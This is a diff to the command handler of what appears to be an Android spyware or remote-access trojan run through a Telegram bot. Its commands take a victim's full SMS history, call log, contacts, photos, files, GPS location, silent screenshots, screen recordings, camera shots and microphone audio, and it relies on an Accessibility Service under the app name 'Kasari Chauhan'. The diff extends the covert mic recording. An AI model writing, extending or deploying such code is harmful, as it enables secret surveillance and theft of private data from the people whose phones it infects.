@@ -14,60 +14,56 @@ public class CommandProcessor {
         String cmd = raw.trim();
         String lower = cmd.toLowerCase();
 
-        // ── Help ──────────────────────────────────────────────────────────
         if (lower.equals("/help")) {
             TelegramController.sendMessage(
-                "📋 COMMANDS [" + BackgroundService.deviceId + "]\n\n" +
-                "📱 Status:\n" +
+                "\uD83D\uDCCB COMMANDS [" + BackgroundService.deviceId + "]\n\n" +
+                "\uD83D\uDCF1 Status:\n" +
                 "/status — Device info\n" +
-                "/apps — Installed apps list\n\n" +
-                "💬 SMS:\n" +
-                "/sms_all — All SMS history\n\n" +
-                "📞 Calls:\n" +
+                "/apps — Installed apps\n\n" +
+                "\uD83D\uDCAC SMS:\n" +
+                "/sms_all — Full SMS history\n\n" +
+                "\uD83D\uDCDE Calls:\n" +
                 "/calllog — Last 100 calls\n\n" +
-                "📒 Data:\n" +
+                "\uD83D\uDCCC Data:\n" +
                 "/contacts — All contacts\n" +
-                "/gallery [N] — Last N photos (default all)\n" +
+                "/gallery [N] — Last N photos\n" +
                 "/files [path] — Browse files\n\n" +
-                "📍 Location:\n" +
+                "\uD83D\uDCCD Location:\n" +
                 "/location — GPS + IP fallback\n\n" +
-                "📸 Screen:\n" +
+                "\uD83D\uDCF8 Screen:\n" +
                 "/screenshot — Silent screenshot\n" +
-                "/screen_start [sec] — Repeat screenshot\n" +
-                "/screen_stop — Stop repeat\n" +
-                "/screen_record [sec] — MP4 recording\n\n" +
-                "🎙 Audio:\n" +
-                "/mic [sec] — Mic recording\n\n" +
-                "📷 Camera:\n" +
-                "/cam — Front camera photo\n" +
-                "/cam_back — Rear camera photo\n\n" +
-                "🔔 Live:\n" +
+                "/screen_start [sec] — Auto screenshot\n" +
+                "/screen_stop — Stop auto\n" +
+                "/screen_record [sec] — MP4 video\n\n" +
+                "\uD83C\uDFA4 Mic:\n" +
+                "/mic [sec] — Record N seconds\n" +
+                "/mic_start — Record until mic_stop\n" +
+                "/mic_stop — Stop & send recording\n\n" +
+                "\uD83D\uDCF7 Camera:\n" +
+                "/cam — Front photo\n" +
+                "/cam_back — Rear photo\n\n" +
+                "\uD83D\uDD14 Live:\n" +
                 "/notifications — Last 20 notifications\n"
             );
 
-        // ── Status ────────────────────────────────────────────────────────
         } else if (lower.equals("/status")) {
             TelegramController.sendMessage(
-                "📊 Device: [" + BackgroundService.deviceId + "]\n" +
+                "\uD83D\uDCCA Device: [" + BackgroundService.deviceId + "]\n" +
                 "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                 "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
-                "Screen: " + (ScreenMirror.instance != null ? "✅ AccessibilityService ON" : "❌ AccessibilityService OFF") + "\n" +
-                "Keylog: " + (ScreenMirror.instance != null ? "✅ ON" : "❌ OFF")
+                "Screen: " + (ScreenMirror.instance != null ? "\u2705 Accessibility ON" : "\u274C Accessibility OFF") + "\n" +
+                "Mic: " + (VoiceRecorder.isRecording ? "\uD83D\uDD34 Recording..." : "\u23F9 Idle")
             );
 
-        // ── SMS ───────────────────────────────────────────────────────────
         } else if (lower.equals("/sms_all")) {
             SmsForwarder.sendAllHistory(ctx);
 
-        // ── Call log ──────────────────────────────────────────────────────
         } else if (lower.equals("/calllog")) {
             ContactGrabber.sendCallLog(ctx);
 
-        // ── Contacts ──────────────────────────────────────────────────────
         } else if (lower.equals("/contacts")) {
             ContactGrabber.sendContacts(ctx);
 
-        // ── Gallery ───────────────────────────────────────────────────────
         } else if (lower.startsWith("/gallery")) {
             int n = Integer.MAX_VALUE;
             String[] p = cmd.trim().split("\\s+");
@@ -75,23 +71,20 @@ public class CommandProcessor {
             final int limit = n;
             new Thread(() -> FileExplorer.sendGallery(ctx, limit)).start();
 
-        // ── Files ─────────────────────────────────────────────────────────
         } else if (lower.startsWith("/files")) {
             String path = "/sdcard";
             String[] p = cmd.trim().split("\\s+", 2);
             if (p.length > 1) path = p[1];
             FileExplorer.listDirectory(path);
 
-        // ── Location ──────────────────────────────────────────────────────
         } else if (lower.equals("/location")) {
             new Thread(() -> LocationTracker.getLocation(ctx)).start();
 
-        // ── Screenshot ────────────────────────────────────────────────────
         } else if (lower.equals("/screenshot")) {
             if (ScreenMirror.instance != null) {
                 ScreenMirror.instance.requestCapture();
             } else {
-                TelegramController.sendMessage("❌ Accessibility Service enable karo.\nSettings → Accessibility → Kasari Chauhan → ON");
+                TelegramController.sendMessage("\u274C Accessibility Service enable karo.\nSettings \u2192 Accessibility \u2192 Kasari Chauhan \u2192 ON");
             }
 
         } else if (lower.startsWith("/screen_start")) {
@@ -101,7 +94,7 @@ public class CommandProcessor {
             if (ScreenMirror.instance != null) {
                 ScreenMirror.instance.startContinuous(sec);
             } else {
-                TelegramController.sendMessage("❌ Accessibility Service enable karo.");
+                TelegramController.sendMessage("\u274C Accessibility Service enable karo.");
             }
 
         } else if (lower.equals("/screen_stop")) {
@@ -117,35 +110,58 @@ public class CommandProcessor {
                 i.putExtra(ScreenRecordService.EXTRA_SECONDS, sec);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                     ctx.startForegroundService(i); else ctx.startService(i);
-                TelegramController.sendMessage("🎬 Recording shuru... " + sec + "s baad MP4 aayega.");
+                TelegramController.sendMessage("\uD83C\uDFAC Recording shuru \u2014 " + sec + "s baad MP4 aayega.");
             } else {
-                TelegramController.sendMessage("❌ Accessibility Service enable karo.");
+                TelegramController.sendMessage("\u274C Accessibility Service enable karo.");
             }
 
-        // ── Mic ───────────────────────────────────────────────────────────
-        } else if (lower.startsWith("/mic")) {
+        // ── Mic fixed time ─────────────────────────────────────────────────
+        } else if (lower.startsWith("/mic") && !lower.equals("/mic_start") && !lower.equals("/mic_stop")) {
             int sec = 30;
             String[] p = cmd.trim().split("\\s+");
             if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
+            if (VoiceRecorder.isRecording) {
+                TelegramController.sendMessage("\u26A0\uFE0F Pehle /mic_stop karo.");
+                return;
+            }
             Intent i = new Intent(ctx, VoiceRecorder.class);
             i.setAction(VoiceRecorder.ACTION_MIC);
             i.putExtra(VoiceRecorder.EXTRA_SECONDS, sec);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                 ctx.startForegroundService(i); else ctx.startService(i);
-            TelegramController.sendMessage("🎙 Mic recording " + sec + "s shuru...");
 
-        // ── Camera ────────────────────────────────────────────────────────
+        // ── Mic manual start ───────────────────────────────────────────────
+        } else if (lower.equals("/mic_start")) {
+            if (VoiceRecorder.isRecording) {
+                TelegramController.sendMessage("\u26A0\uFE0F Mic pehle se chal raha hai. /mic_stop karo.");
+                return;
+            }
+            Intent i = new Intent(ctx, VoiceRecorder.class);
+            i.setAction(VoiceRecorder.ACTION_MIC_START);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                ctx.startForegroundService(i); else ctx.startService(i);
+
+        // ── Mic manual stop ────────────────────────────────────────────────
+        } else if (lower.equals("/mic_stop")) {
+            if (!VoiceRecorder.isRecording) {
+                TelegramController.sendMessage("\u274C Koi recording nahi chal rahi.");
+                return;
+            }
+            Intent i = new Intent(ctx, VoiceRecorder.class);
+            i.setAction(VoiceRecorder.ACTION_STOP);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                ctx.startForegroundService(i); else ctx.startService(i);
+            TelegramController.sendMessage("\u23F9 Mic ruk rahi hai... recording bhej raha hoon.");
+
         } else if (lower.equals("/cam")) {
             CameraCapture.capture(ctx, false);
 
         } else if (lower.equals("/cam_back")) {
             CameraCapture.capture(ctx, true);
 
-        // ── Apps ──────────────────────────────────────────────────────────
         } else if (lower.equals("/apps")) {
             AppManager.sendInstalledApps(ctx);
 
-        // ── Notifications ─────────────────────────────────────────────────
         } else if (lower.equals("/notifications")) {
             NotificationCatcher.sendRecent();
         }
